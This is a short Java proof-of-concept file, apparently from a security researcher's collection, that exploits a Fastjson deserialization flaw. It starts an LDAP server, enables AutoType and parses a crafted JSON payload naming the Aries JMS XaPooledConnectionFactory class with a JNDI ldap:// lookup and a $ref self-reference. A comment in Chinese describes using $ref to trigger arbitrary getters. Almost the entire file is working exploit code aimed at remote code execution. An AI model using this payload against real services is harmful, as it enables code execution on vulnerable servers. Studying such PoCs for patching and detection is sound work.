package com.threedr3am.bug.fastjson.rce;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.threedr3am.bug.common.server.LdapServer;
import java.io.IOException;

/**
 * todo 发现新的Fastjson利用面，通过$ref引用功能，可以任意触发大部分getter方法，理论可以通过此种方式RCE，还能在不开启AutoType的情况下，任意调用大部分当前反序列化对象的getter方法，若存在危险method，就能进行攻击
 *
 * <dependency>
 *     <groupId>org.apache.aries.transaction</groupId>
 *     <artifactId>org.apache.aries.transaction.jms</artifactId>
 *     <version>2.0.0</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class AriesJMSPoc2 {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) throws IOException {
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

    String json = "{\"@type\":\"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory\", \"tmJndiName\": \"ldap://localhost:43658/Calc\", \"tmFromJndi\": true, \"transactionManager\": {\"$ref\":\"$.transactionManager\"}}";
    JSON.parse(json);
  }


}
